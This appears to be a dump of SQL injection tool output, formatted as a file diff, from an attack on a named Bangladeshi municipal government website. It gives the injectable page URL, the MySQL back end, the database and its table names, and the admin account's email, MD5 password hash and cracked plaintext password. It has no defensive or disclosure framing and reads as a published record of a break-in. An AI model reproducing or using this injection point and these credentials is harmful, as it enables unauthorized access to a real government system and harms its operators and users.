@@ -1,0 +1,40 @@
+.gov Government
+
+.bd Bangladesh
+
+Chaumahani Municipality, Begumganj, Noakhali Developed by explore IT
+
+http://chowmuhanimunicipality.gov.bd/page.php?id=83
+
+the back-end DBMS is MySQL
+web application technology: Apache
+the back-end DBMS: MySQL 5
+
+available databases [1]:
+[+] chowmuha_iond
+
+Database: chowmuha_iond
+[12 tables]
++---------------+
+| admin         |
+| contact       |
+| dbase         |
+| external_link |
+| menu          |
+| page          |
+| photo_album   |
+| photos        |
+| scroller      |
+| site          |
+| slider        |
+| videos        |
++---------------+
+
+Database: chowmuha_iond
+Table: admin
+[1 entry]
++----------+-----------------+------------------------------------------+
+| fullname | email           | password                                 |
++----------+-----------------+------------------------------------------+
+| Admin    | admin@admin.com | 21232f297a57a5a743894a0e4a801fc3 (admin) |
++----------+-----------------+------------------------------------------+
